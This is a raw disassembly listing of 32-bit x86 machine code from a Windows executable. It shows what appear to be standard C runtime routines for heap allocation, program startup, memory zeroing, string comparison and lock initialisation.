  402ca2:	83 3d f8 d8 40 00 03 	cmpl   $0x3,0x40d8f8
  402ca9:	75 43                	jne    0x402cee
  402cab:	6a 04                	push   $0x4
  402cad:	e8 cc 06 00 00       	call   0x40337e
  402cb2:	59                   	pop    %ecx
  402cb3:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  402cb7:	56                   	push   %esi
  402cb8:	e8 a8 20 00 00       	call   0x404d65
  402cbd:	59                   	pop    %ecx
  402cbe:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  402cc1:	85 c0                	test   %eax,%eax
  402cc3:	74 09                	je     0x402cce
  402cc5:	56                   	push   %esi
  402cc6:	50                   	push   %eax
  402cc7:	e8 c4 20 00 00       	call   0x404d90
  402ccc:	59                   	pop    %ecx
  402ccd:	59                   	pop    %ecx
  402cce:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  402cd5:	e8 0b 00 00 00       	call   0x402ce5
  402cda:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  402cde:	75 37                	jne    0x402d17
  402ce0:	ff 75 08             	push   0x8(%ebp)
  402ce3:	eb 0a                	jmp    0x402cef
  402ce5:	6a 04                	push   $0x4
  402ce7:	e8 ba 05 00 00       	call   0x4032a6
  402cec:	59                   	pop    %ecx
  402ced:	c3                   	ret
  402cee:	56                   	push   %esi
  402cef:	6a 00                	push   $0x0
  402cf1:	ff 35 94 d5 40 00    	push   0x40d594
  402cf7:	ff 15 cc 90 40 00    	call   *0x4090cc
  402cfd:	85 c0                	test   %eax,%eax
  402cff:	75 16                	jne    0x402d17
  402d01:	e8 27 17 00 00       	call   0x40442d
  402d06:	8b f0                	mov    %eax,%esi
  402d08:	ff 15 c0 90 40 00    	call   *0x4090c0
  402d0e:	50                   	push   %eax
  402d0f:	e8 de 16 00 00       	call   0x4043f2
  402d14:	89 06                	mov    %eax,(%esi)
  402d16:	59                   	pop    %ecx
  402d17:	e8 7d 12 00 00       	call   0x403f99
  402d1c:	c3                   	ret
  402d1d:	6a 0c                	push   $0xc
  402d1f:	68 08 ae 40 00       	push   $0x40ae08
  402d24:	e8 2b 12 00 00       	call   0x403f54
  402d29:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  402d2d:	8b 75 08             	mov    0x8(%ebp),%esi
  402d30:	3b 35 e8 d8 40 00    	cmp    0x40d8e8,%esi
  402d36:	77 22                	ja     0x402d5a
  402d38:	6a 04                	push   $0x4
  402d3a:	e8 3f 06 00 00       	call   0x40337e
  402d3f:	59                   	pop    %ecx
  402d40:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  402d44:	56                   	push   %esi
  402d45:	e8 ef 27 00 00       	call   0x405539
  402d4a:	59                   	pop    %ecx
  402d4b:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  402d4e:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  402d55:	e8 09 00 00 00       	call   0x402d63
  402d5a:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402d5d:	e8 37 12 00 00       	call   0x403f99
  402d62:	c3                   	ret
  402d63:	6a 04                	push   $0x4
  402d65:	e8 3c 05 00 00       	call   0x4032a6
  402d6a:	59                   	pop    %ecx
  402d6b:	c3                   	ret
  402d6c:	55                   	push   %ebp
  402d6d:	8b 6c 24 08          	mov    0x8(%esp),%ebp
  402d71:	83 fd e0             	cmp    $0xffffffe0,%ebp
  402d74:	0f 87 9f 00 00 00    	ja     0x402e19
  402d7a:	53                   	push   %ebx
  402d7b:	8b 1d d0 90 40 00    	mov    0x4090d0,%ebx
  402d81:	56                   	push   %esi
  402d82:	57                   	push   %edi
  402d83:	33 f6                	xor    %esi,%esi
  402d85:	39 35 94 d5 40 00    	cmp    %esi,0x40d594
  402d8b:	8b fd                	mov    %ebp,%edi
  402d8d:	75 18                	jne    0x402da7
  402d8f:	e8 25 16 00 00       	call   0x4043b9
  402d94:	6a 1e                	push   $0x1e
  402d96:	e8 7e 14 00 00       	call   0x404219
  402d9b:	68 ff 00 00 00       	push   $0xff
  402da0:	e8 4a f8 ff ff       	call   0x4025ef
  402da5:	59                   	pop    %ecx
  402da6:	59                   	pop    %ecx
  402da7:	a1 f8 d8 40 00       	mov    0x40d8f8,%eax
  402dac:	83 f8 01             	cmp    $0x1,%eax
  402daf:	75 0e                	jne    0x402dbf
  402db1:	3b ee                	cmp    %esi,%ebp
  402db3:	74 04                	je     0x402db9
  402db5:	8b c5                	mov    %ebp,%eax
  402db7:	eb 03                	jmp    0x402dbc
  402db9:	33 c0                	xor    %eax,%eax
  402dbb:	40                   	inc    %eax
  402dbc:	50                   	push   %eax
  402dbd:	eb 1e                	jmp    0x402ddd
  402dbf:	83 f8 03             	cmp    $0x3,%eax
  402dc2:	75 0b                	jne    0x402dcf
  402dc4:	55                   	push   %ebp
  402dc5:	e8 53 ff ff ff       	call   0x402d1d
  402dca:	3b c6                	cmp    %esi,%eax
  402dcc:	59                   	pop    %ecx
  402dcd:	75 17                	jne    0x402de6
  402dcf:	3b ee                	cmp    %esi,%ebp
  402dd1:	75 03                	jne    0x402dd6
  402dd3:	33 ff                	xor    %edi,%edi
  402dd5:	47                   	inc    %edi
  402dd6:	83 c7 0f             	add    $0xf,%edi
  402dd9:	83 e7 f0             	and    $0xfffffff0,%edi
  402ddc:	57                   	push   %edi
  402ddd:	56                   	push   %esi
  402dde:	ff 35 94 d5 40 00    	push   0x40d594
  402de4:	ff d3                	call   *%ebx
  402de6:	8b f0                	mov    %eax,%esi
  402de8:	85 f6                	test   %esi,%esi
  402dea:	75 26                	jne    0x402e12
  402dec:	39 05 9c d5 40 00    	cmp    %eax,0x40d59c
  402df2:	6a 0c                	push   $0xc
  402df4:	5f                   	pop    %edi
  402df5:	74 0d                	je     0x402e04
  402df7:	55                   	push   %ebp
  402df8:	e8 6f 1c 00 00       	call   0x404a6c
  402dfd:	85 c0                	test   %eax,%eax
  402dff:	59                   	pop    %ecx
  402e00:	75 81                	jne    0x402d83
  402e02:	eb 07                	jmp    0x402e0b
  402e04:	e8 24 16 00 00       	call   0x40442d
  402e09:	89 38                	mov    %edi,(%eax)
  402e0b:	e8 1d 16 00 00       	call   0x40442d
  402e10:	89 38                	mov    %edi,(%eax)
  402e12:	5f                   	pop    %edi
  402e13:	8b c6                	mov    %esi,%eax
  402e15:	5e                   	pop    %esi
  402e16:	5b                   	pop    %ebx
  402e17:	5d                   	pop    %ebp
  402e18:	c3                   	ret
  402e19:	55                   	push   %ebp
  402e1a:	e8 4d 1c 00 00       	call   0x404a6c
  402e1f:	59                   	pop    %ecx
  402e20:	e8 08 16 00 00       	call   0x40442d
  402e25:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  402e2b:	33 c0                	xor    %eax,%eax
  402e2d:	5d                   	pop    %ebp
  402e2e:	c3                   	ret
  402e2f:	e9 5b fe ff ff       	jmp    0x402c8f
  402e34:	83 3d a8 d0 40 00 01 	cmpl   $0x1,0x40d0a8
  402e3b:	75 05                	jne    0x402e42
  402e3d:	e8 77 15 00 00       	call   0x4043b9
  402e42:	ff 74 24 04          	push   0x4(%esp)
  402e46:	e8 ce 13 00 00       	call   0x404219
  402e4b:	68 ff 00 00 00       	push   $0xff
  402e50:	e8 9a f7 ff ff       	call   0x4025ef
  402e55:	59                   	pop    %ecx
  402e56:	59                   	pop    %ecx
  402e57:	c3                   	ret
  402e58:	66 81 3d 00 00 40 00 	cmpw   $0x5a4d,0x400000
  402e5f:	4d 5a 
  402e61:	75 33                	jne    0x402e96
  402e63:	a1 3c 00 40 00       	mov    0x40003c,%eax
  402e68:	81 b8 00 00 40 00 50 	cmpl   $0x4550,0x400000(%eax)
  402e6f:	45 00 00 
  402e72:	75 22                	jne    0x402e96
  402e74:	66 81 b8 18 00 40 00 	cmpw   $0x10b,0x400018(%eax)
  402e7b:	0b 01 
  402e7d:	75 17                	jne    0x402e96
  402e7f:	83 b8 74 00 40 00 0e 	cmpl   $0xe,0x400074(%eax)
  402e86:	76 0e                	jbe    0x402e96
  402e88:	33 c9                	xor    %ecx,%ecx
  402e8a:	39 88 e8 00 40 00    	cmp    %ecx,0x4000e8(%eax)
  402e90:	0f 95 c1             	setne  %cl
  402e93:	8b c1                	mov    %ecx,%eax
  402e95:	c3                   	ret
  402e96:	33 c0                	xor    %eax,%eax
  402e98:	c3                   	ret
  402e99:	6a 60                	push   $0x60
  402e9b:	68 28 ae 40 00       	push   $0x40ae28
  402ea0:	e8 af 10 00 00       	call   0x403f54
  402ea5:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  402ea9:	8d 45 90             	lea    -0x70(%ebp),%eax
  402eac:	50                   	push   %eax
  402ead:	ff 15 e0 90 40 00    	call   *0x4090e0
  402eb3:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  402eba:	bf 94 00 00 00       	mov    $0x94,%edi
  402ebf:	57                   	push   %edi
  402ec0:	6a 00                	push   $0x0
  402ec2:	8b 1d dc 90 40 00    	mov    0x4090dc,%ebx
  402ec8:	ff d3                	call   *%ebx
  402eca:	50                   	push   %eax
  402ecb:	ff 15 d0 90 40 00    	call   *0x4090d0
  402ed1:	8b f0                	mov    %eax,%esi
  402ed3:	85 f6                	test   %esi,%esi
  402ed5:	75 0d                	jne    0x402ee4
  402ed7:	6a 12                	push   $0x12
  402ed9:	e8 56 ff ff ff       	call   0x402e34
  402ede:	59                   	pop    %ecx
  402edf:	e9 8a 01 00 00       	jmp    0x40306e
  402ee4:	89 3e                	mov    %edi,(%esi)
  402ee6:	56                   	push   %esi
  402ee7:	ff 15 d8 90 40 00    	call   *0x4090d8
  402eed:	56                   	push   %esi
  402eee:	6a 00                	push   $0x0
  402ef0:	85 c0                	test   %eax,%eax
  402ef2:	75 0e                	jne    0x402f02
  402ef4:	ff d3                	call   *%ebx
  402ef6:	50                   	push   %eax
  402ef7:	ff 15 cc 90 40 00    	call   *0x4090cc
  402efd:	e9 6c 01 00 00       	jmp    0x40306e
  402f02:	8b 46 10             	mov    0x10(%esi),%eax
  402f05:	89 45 e0             	mov    %eax,-0x20(%ebp)
  402f08:	8b 46 04             	mov    0x4(%esi),%eax
  402f0b:	89 45 dc             	mov    %eax,-0x24(%ebp)
  402f0e:	8b 46 08             	mov    0x8(%esi),%eax
  402f11:	89 45 d8             	mov    %eax,-0x28(%ebp)
  402f14:	8b 7e 0c             	mov    0xc(%esi),%edi
  402f17:	81 e7 ff 7f 00 00    	and    $0x7fff,%edi
  402f1d:	ff d3                	call   *%ebx
  402f1f:	50                   	push   %eax
  402f20:	ff 15 cc 90 40 00    	call   *0x4090cc
  402f26:	8b 75 e0             	mov    -0x20(%ebp),%esi
  402f29:	83 fe 02             	cmp    $0x2,%esi
  402f2c:	74 06                	je     0x402f34
  402f2e:	81 cf 00 80 00 00    	or     $0x8000,%edi
  402f34:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  402f37:	8b c1                	mov    %ecx,%eax
  402f39:	c1 e0 08             	shl    $0x8,%eax
  402f3c:	8b 55 d8             	mov    -0x28(%ebp),%edx
  402f3f:	03 c2                	add    %edx,%eax
  402f41:	89 35 5c d0 40 00    	mov    %esi,0x40d05c
  402f47:	a3 64 d0 40 00       	mov    %eax,0x40d064
  402f4c:	89 0d 68 d0 40 00    	mov    %ecx,0x40d068
  402f52:	89 15 6c d0 40 00    	mov    %edx,0x40d06c
  402f58:	89 3d 60 d0 40 00    	mov    %edi,0x40d060
  402f5e:	e8 f5 fe ff ff       	call   0x402e58
  402f63:	89 45 e0             	mov    %eax,-0x20(%ebp)
  402f66:	33 db                	xor    %ebx,%ebx
  402f68:	43                   	inc    %ebx
  402f69:	53                   	push   %ebx
  402f6a:	e8 54 1d 00 00       	call   0x404cc3
  402f6f:	59                   	pop    %ecx
  402f70:	85 c0                	test   %eax,%eax
  402f72:	75 08                	jne    0x402f7c
  402f74:	6a 1c                	push   $0x1c
  402f76:	e8 b9 fe ff ff       	call   0x402e34
  402f7b:	59                   	pop    %ecx
  402f7c:	e8 a0 f4 ff ff       	call   0x402421
  402f81:	85 c0                	test   %eax,%eax
  402f83:	75 08                	jne    0x402f8d
  402f85:	6a 10                	push   $0x10
  402f87:	e8 a8 fe ff ff       	call   0x402e34
  402f8c:	59                   	pop    %ecx
  402f8d:	e8 e4 15 00 00       	call   0x404576
  402f92:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402f95:	e8 8b 2d 00 00       	call   0x405d25
  402f9a:	85 c0                	test   %eax,%eax
  402f9c:	7d 08                	jge    0x402fa6
  402f9e:	6a 1b                	push   $0x1b
  402fa0:	e8 00 f6 ff ff       	call   0x4025a5
  402fa5:	59                   	pop    %ecx
  402fa6:	ff 15 d4 90 40 00    	call   *0x4090d4
  402fac:	a3 08 d9 40 00       	mov    %eax,0x40d908
  402fb1:	e8 3a 2c 00 00       	call   0x405bf0
  402fb6:	a3 a0 d0 40 00       	mov    %eax,0x40d0a0
  402fbb:	e8 77 2b 00 00       	call   0x405b37
  402fc0:	85 c0                	test   %eax,%eax
  402fc2:	7d 08                	jge    0x402fcc
  402fc4:	6a 08                	push   $0x8
  402fc6:	e8 da f5 ff ff       	call   0x4025a5
  402fcb:	59                   	pop    %ecx
  402fcc:	e8 f3 28 00 00       	call   0x4058c4
  402fd1:	85 c0                	test   %eax,%eax
  402fd3:	7d 08                	jge    0x402fdd
  402fd5:	6a 09                	push   $0x9
  402fd7:	e8 c9 f5 ff ff       	call   0x4025a5
  402fdc:	59                   	pop    %ecx
  402fdd:	53                   	push   %ebx
  402fde:	e8 de f6 ff ff       	call   0x4026c1
  402fe3:	59                   	pop    %ecx
  402fe4:	85 c0                	test   %eax,%eax
  402fe6:	74 07                	je     0x402fef
  402fe8:	50                   	push   %eax
  402fe9:	e8 b7 f5 ff ff       	call   0x4025a5
  402fee:	59                   	pop    %ecx
  402fef:	e8 73 28 00 00       	call   0x405867
  402ff4:	84 5d bc             	test   %bl,-0x44(%ebp)
  402ff7:	74 06                	je     0x402fff
  402ff9:	0f b7 4d c0          	movzwl -0x40(%ebp),%ecx
  402ffd:	eb 03                	jmp    0x403002
  402fff:	6a 0a                	push   $0xa
  403001:	59                   	pop    %ecx
  403002:	51                   	push   %ecx
  403003:	50                   	push   %eax
  403004:	6a 00                	push   $0x0
  403006:	68 00 00 40 00       	push   $0x400000
  40300b:	e8 0e e2 ff ff       	call   0x40121e
  403010:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  403013:	83 7d e0 00          	cmpl   $0x0,-0x20(%ebp)
  403017:	75 06                	jne    0x40301f
  403019:	50                   	push   %eax
  40301a:	e8 16 f8 ff ff       	call   0x402835
  40301f:	e8 33 f8 ff ff       	call   0x402857
  403024:	eb 2e                	jmp    0x403054
  403026:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403029:	8b 08                	mov    (%eax),%ecx
  40302b:	8b 09                	mov    (%ecx),%ecx
  40302d:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  403030:	50                   	push   %eax
  403031:	51                   	push   %ecx
  403032:	e8 be 0d 00 00       	call   0x403df5
  403037:	59                   	pop    %ecx
  403038:	59                   	pop    %ecx
  403039:	c3                   	ret
  40303a:	8b 65 e8             	mov    -0x18(%ebp),%esp
  40303d:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  403040:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  403043:	83 7d e0 00          	cmpl   $0x0,-0x20(%ebp)
  403047:	75 06                	jne    0x40304f
  403049:	50                   	push   %eax
  40304a:	e8 f7 f7 ff ff       	call   0x402846
  40304f:	e8 12 f8 ff ff       	call   0x402866
  403054:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40305b:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40305e:	eb 13                	jmp    0x403073
  403060:	33 c0                	xor    %eax,%eax
  403062:	40                   	inc    %eax
  403063:	c3                   	ret
  403064:	8b 65 e8             	mov    -0x18(%ebp),%esp
  403067:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40306e:	b8 ff 00 00 00       	mov    $0xff,%eax
  403073:	e8 21 0f 00 00       	call   0x403f99
  403078:	c3                   	ret
  403079:	e8 fb 2e 00 00       	call   0x405f79
  40307e:	e9 16 fe ff ff       	jmp    0x402e99
  403083:	55                   	push   %ebp
  403084:	8b ec                	mov    %esp,%ebp
  403086:	83 ec 04             	sub    $0x4,%esp
  403089:	89 7d fc             	mov    %edi,-0x4(%ebp)
  40308c:	8b 7d 08             	mov    0x8(%ebp),%edi
  40308f:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  403092:	c1 e9 07             	shr    $0x7,%ecx
  403095:	66 0f ef c0          	pxor   %xmm0,%xmm0
  403099:	eb 08                	jmp    0x4030a3
  40309b:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  4030a2:	90                   	nop
  4030a3:	66 0f 7f 07          	movdqa %xmm0,(%edi)
  4030a7:	66 0f 7f 47 10       	movdqa %xmm0,0x10(%edi)
  4030ac:	66 0f 7f 47 20       	movdqa %xmm0,0x20(%edi)
  4030b1:	66 0f 7f 47 30       	movdqa %xmm0,0x30(%edi)
  4030b6:	66 0f 7f 47 40       	movdqa %xmm0,0x40(%edi)
  4030bb:	66 0f 7f 47 50       	movdqa %xmm0,0x50(%edi)
  4030c0:	66 0f 7f 47 60       	movdqa %xmm0,0x60(%edi)
  4030c5:	66 0f 7f 47 70       	movdqa %xmm0,0x70(%edi)
  4030ca:	8d bf 80 00 00 00    	lea    0x80(%edi),%edi
  4030d0:	49                   	dec    %ecx
  4030d1:	75 d0                	jne    0x4030a3
  4030d3:	8b 7d fc             	mov    -0x4(%ebp),%edi
  4030d6:	8b e5                	mov    %ebp,%esp
  4030d8:	5d                   	pop    %ebp
  4030d9:	c3                   	ret
  4030da:	55                   	push   %ebp
  4030db:	8b ec                	mov    %esp,%ebp
  4030dd:	83 ec 10             	sub    $0x10,%esp
  4030e0:	89 7d fc             	mov    %edi,-0x4(%ebp)
  4030e3:	8b 45 08             	mov    0x8(%ebp),%eax
  4030e6:	99                   	cltd
  4030e7:	8b f8                	mov    %eax,%edi
  4030e9:	33 fa                	xor    %edx,%edi
  4030eb:	2b fa                	sub    %edx,%edi
  4030ed:	83 e7 0f             	and    $0xf,%edi
  4030f0:	33 fa                	xor    %edx,%edi
  4030f2:	2b fa                	sub    %edx,%edi
  4030f4:	85 ff                	test   %edi,%edi
  4030f6:	75 3c                	jne    0x403134
  4030f8:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4030fb:	8b d1                	mov    %ecx,%edx
  4030fd:	83 e2 7f             	and    $0x7f,%edx
  403100:	89 55 f4             	mov    %edx,-0xc(%ebp)
  403103:	3b ca                	cmp    %edx,%ecx
  403105:	74 12                	je     0x403119
  403107:	2b ca                	sub    %edx,%ecx
  403109:	51                   	push   %ecx
  40310a:	50                   	push   %eax
  40310b:	e8 73 ff ff ff       	call   0x403083
  403110:	83 c4 08             	add    $0x8,%esp
  403113:	8b 45 08             	mov    0x8(%ebp),%eax
  403116:	8b 55 f4             	mov    -0xc(%ebp),%edx
  403119:	85 d2                	test   %edx,%edx
  40311b:	74 45                	je     0x403162
  40311d:	03 45 10             	add    0x10(%ebp),%eax
  403120:	2b c2                	sub    %edx,%eax
  403122:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403125:	33 c0                	xor    %eax,%eax
  403127:	8b 7d f8             	mov    -0x8(%ebp),%edi
  40312a:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40312d:	f3 aa                	rep stos %al,%es:(%edi)
  40312f:	8b 45 08             	mov    0x8(%ebp),%eax
  403132:	eb 2e                	jmp    0x403162
  403134:	f7 df                	neg    %edi
  403136:	83 c7 10             	add    $0x10,%edi
  403139:	89 7d f0             	mov    %edi,-0x10(%ebp)
  40313c:	33 c0                	xor    %eax,%eax
  40313e:	8b 7d 08             	mov    0x8(%ebp),%edi
  403141:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403144:	f3 aa                	rep stos %al,%es:(%edi)
  403146:	8b 45 f0             	mov    -0x10(%ebp),%eax
  403149:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40314c:	8b 55 10             	mov    0x10(%ebp),%edx
  40314f:	03 c8                	add    %eax,%ecx
  403151:	2b d0                	sub    %eax,%edx
  403153:	52                   	push   %edx
  403154:	6a 00                	push   $0x0
  403156:	51                   	push   %ecx
  403157:	e8 7e ff ff ff       	call   0x4030da
  40315c:	83 c4 0c             	add    $0xc,%esp
  40315f:	8b 45 08             	mov    0x8(%ebp),%eax
  403162:	8b 7d fc             	mov    -0x4(%ebp),%edi
  403165:	8b e5                	mov    %ebp,%esp
  403167:	5d                   	pop    %ebp
  403168:	c3                   	ret
  403169:	83 25 00 d9 40 00 00 	andl   $0x0,0x40d900
  403170:	e8 e8 2e 00 00       	call   0x40605d
  403175:	a3 00 d9 40 00       	mov    %eax,0x40d900
  40317a:	33 c0                	xor    %eax,%eax
  40317c:	c3                   	ret
  40317d:	cc                   	int3
  40317e:	cc                   	int3
  40317f:	cc                   	int3
  403180:	8b 54 24 04          	mov    0x4(%esp),%edx
  403184:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  403188:	f7 c2 03 00 00 00    	test   $0x3,%edx
  40318e:	75 3c                	jne    0x4031cc
  403190:	8b 02                	mov    (%edx),%eax
  403192:	3a 01                	cmp    (%ecx),%al
  403194:	75 2e                	jne    0x4031c4
  403196:	0a c0                	or     %al,%al
  403198:	74 26                	je     0x4031c0
  40319a:	3a 61 01             	cmp    0x1(%ecx),%ah
  40319d:	75 25                	jne    0x4031c4
  40319f:	0a e4                	or     %ah,%ah
  4031a1:	74 1d                	je     0x4031c0
  4031a3:	c1 e8 10             	shr    $0x10,%eax
  4031a6:	3a 41 02             	cmp    0x2(%ecx),%al
  4031a9:	75 19                	jne    0x4031c4
  4031ab:	0a c0                	or     %al,%al
  4031ad:	74 11                	je     0x4031c0
  4031af:	3a 61 03             	cmp    0x3(%ecx),%ah
  4031b2:	75 10                	jne    0x4031c4
  4031b4:	83 c1 04             	add    $0x4,%ecx
  4031b7:	83 c2 04             	add    $0x4,%edx
  4031ba:	0a e4                	or     %ah,%ah
  4031bc:	75 d2                	jne    0x403190
  4031be:	8b ff                	mov    %edi,%edi
  4031c0:	33 c0                	xor    %eax,%eax
  4031c2:	c3                   	ret
  4031c3:	90                   	nop
  4031c4:	1b c0                	sbb    %eax,%eax
  4031c6:	d1 e0                	shl    $1,%eax
  4031c8:	83 c0 01             	add    $0x1,%eax
  4031cb:	c3                   	ret
  4031cc:	f7 c2 01 00 00 00    	test   $0x1,%edx
  4031d2:	74 18                	je     0x4031ec
  4031d4:	8a 02                	mov    (%edx),%al
  4031d6:	83 c2 01             	add    $0x1,%edx
  4031d9:	3a 01                	cmp    (%ecx),%al
  4031db:	75 e7                	jne    0x4031c4
  4031dd:	83 c1 01             	add    $0x1,%ecx
  4031e0:	0a c0                	or     %al,%al
  4031e2:	74 dc                	je     0x4031c0
  4031e4:	f7 c2 02 00 00 00    	test   $0x2,%edx
  4031ea:	74 a4                	je     0x403190
  4031ec:	66 8b 02             	mov    (%edx),%ax
  4031ef:	83 c2 02             	add    $0x2,%edx
  4031f2:	3a 01                	cmp    (%ecx),%al
  4031f4:	75 ce                	jne    0x4031c4
  4031f6:	0a c0                	or     %al,%al
  4031f8:	74 c6                	je     0x4031c0
  4031fa:	3a 61 01             	cmp    0x1(%ecx),%ah
  4031fd:	75 c5                	jne    0x4031c4
  4031ff:	0a e4                	or     %ah,%ah
  403201:	74 bd                	je     0x4031c0
  403203:	83 c1 02             	add    $0x2,%ecx
  403206:	eb 88                	jmp    0x403190
  403208:	56                   	push   %esi
  403209:	57                   	push   %edi
  40320a:	33 f6                	xor    %esi,%esi
  40320c:	bf b0 d0 40 00       	mov    $0x40d0b0,%edi
  403211:	83 3c f5 64 c0 40 00 	cmpl   $0x1,0x40c064(,%esi,8)
  403218:	01 
  403219:	75 1e                	jne    0x403239
  40321b:	8d 04 f5 60 c0 40 00 	lea    0x40c060(,%esi,8),%eax
  403222:	89 38                	mov    %edi,(%eax)
  403224:	68 a0 0f 00 00       	push   $0xfa0
  403229:	ff 30                	push   (%eax)
  40322b:	83 c7 18             	add    $0x18,%edi
  40322e:	e8 6a 17 00 00       	call   0x40499d
  403233:	85 c0                	test   %eax,%eax
  403235:	59                   	pop    %ecx
  403236:	59                   	pop    %ecx
  403237:	74 0c                	je     0x403245
  403239:	46                   	inc    %esi
  40323a:	83 fe 24             	cmp    $0x24,%esi
  40323d:	7c d2                	jl     0x403211
  40323f:	33 c0                	xor    %eax,%eax
  403241:	40                   	inc    %eax
  403242:	5f                   	pop    %edi
  403243:	5e                   	pop    %esi
  403244:	c3                   	ret
  403245:	83 24 f5 60 c0 40 00 	andl   $0x0,0x40c060(,%esi,8)
  40324c:	00 
  40324d:	33 c0                	xor    %eax,%eax
  40324f:	eb f1                	jmp    0x403242
  403251:	53                   	push   %ebx
  403252:	8b 1d e4 90 40 00    	mov    0x4090e4,%ebx
  403258:	56                   	push   %esi
  403259:	be 60 c0 40 00       	mov    $0x40c060,%esi
  40325e:	57                   	push   %edi
  40325f:	8b 3e                	mov    (%esi),%edi
  403261:	85 ff                	test   %edi,%edi
  403263:	74 13                	je     0x403278
  403265:	83 7e 04 01          	cmpl   $0x1,0x4(%esi)
  403269:	74 0d                	je     0x403278
  40326b:	57                   	push   %edi
  40326c:	ff d3                	call   *%ebx
  40326e:	57                   	push   %edi
  40326f:	e8 1b fa ff ff       	call   0x402c8f
  403274:	83 26 00             	andl   $0x0,(%esi)
  403277:	59                   	pop    %ecx
  403278:	83 c6 08             	add    $0x8,%esi
  40327b:	81 fe 80 c1 40 00    	cmp    $0x40c180,%esi
  403281:	7c dc                	jl     0x40325f
  403283:	be 60 c0 40 00       	mov    $0x40c060,%esi
  403288:	5f                   	pop    %edi
  403289:	8b 06                	mov    (%esi),%eax
  40328b:	85 c0                	test   %eax,%eax
  40328d:	74 09                	je     0x403298
  40328f:	83 7e 04 01          	cmpl   $0x1,0x4(%esi)
  403293:	75 03                	jne    0x403298
  403295:	50                   	push   %eax
  403296:	ff d3                	call   *%ebx
  403298:	83 c6 08             	add    $0x8,%esi
  40329b:	81 fe 80 c1 40 00    	cmp    $0x40c180,%esi
  4032a1:	7c e6                	jl     0x403289
  4032a3:	5e                   	pop    %esi
  4032a4:	5b                   	pop    %ebx
  4032a5:	c3                   	ret
  4032a6:	55                   	push   %ebp
  4032a7:	8b ec                	mov    %esp,%ebp
  4032a9:	8b 45 08             	mov    0x8(%ebp),%eax
  4032ac:	ff 34 c5 60 c0 40 00 	push   0x40c060(,%eax,8)
  4032b3:	ff 15 e8 90 40 00    	call   *0x4090e8
  4032b9:	5d                   	pop    %ebp
  4032ba:	c3                   	ret
  4032bb:	6a 0c                	push   $0xc
  4032bd:	68 50 ae 40 00       	push   $0x40ae50
  4032c2:	e8 8d 0c 00 00       	call   0x403f54
  4032c7:	33 ff                	xor    %edi,%edi
  4032c9:	47                   	inc    %edi
  4032ca:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  4032cd:	33 db                	xor    %ebx,%ebx
  4032cf:	39 1d 94 d5 40 00    	cmp    %ebx,0x40d594
  4032d5:	75 18                	jne    0x4032ef
  4032d7:	e8 dd 10 00 00       	call   0x4043b9
  4032dc:	6a 1e                	push   $0x1e
  4032de:	e8 36 0f 00 00       	call   0x404219
  4032e3:	68 ff 00 00 00       	push   $0xff
  4032e8:	e8 02 f3 ff ff       	call   0x4025ef
  4032ed:	59                   	pop    %ecx
  4032ee:	59                   	pop    %ecx
  4032ef:	8b 75 08             	mov    0x8(%ebp),%esi
  4032f2:	8d 34 f5 60 c0 40 00 	lea    0x40c060(,%esi,8),%esi
  4032f9:	39 1e                	cmp    %ebx,(%esi)
  4032fb:	74 04                	je     0x403301
  4032fd:	8b c7                	mov    %edi,%eax
  4032ff:	eb 6e                	jmp    0x40336f
  403301:	6a 18                	push   $0x18
  403303:	e8 3e 0e 00 00       	call   0x404146
  403308:	59                   	pop    %ecx
  403309:	8b f8                	mov    %eax,%edi
  40330b:	3b fb                	cmp    %ebx,%edi
  40330d:	75 0f                	jne    0x40331e
  40330f:	e8 19 11 00 00       	call   0x40442d
  403314:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  40331a:	33 c0                	xor    %eax,%eax
  40331c:	eb 51                	jmp    0x40336f
  40331e:	6a 0a                	push   $0xa
  403320:	e8 59 00 00 00       	call   0x40337e
  403325:	59                   	pop    %ecx
  403326:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  403329:	39 1e                	cmp    %ebx,(%esi)
  40332b:	75 2c                	jne    0x403359
  40332d:	68 a0 0f 00 00       	push   $0xfa0
  403332:	57                   	push   %edi
  403333:	e8 65 16 00 00       	call   0x40499d
  403338:	59                   	pop    %ecx
  403339:	59                   	pop    %ecx
  40333a:	85 c0                	test   %eax,%eax
  40333c:	75 17                	jne    0x403355
  40333e:	57                   	push   %edi
  40333f:	e8 4b f9 ff ff       	call   0x402c8f
  403344:	59                   	pop    %ecx
  403345:	e8 e3 10 00 00       	call   0x40442d
  40334a:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  403350:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  403353:	eb 0b                	jmp    0x403360
  403355:	89 3e                	mov    %edi,(%esi)
  403357:	eb 07                	jmp    0x403360
  403359:	57                   	push   %edi
  40335a:	e8 30 f9 ff ff       	call   0x402c8f
  40335f:	59                   	pop    %ecx
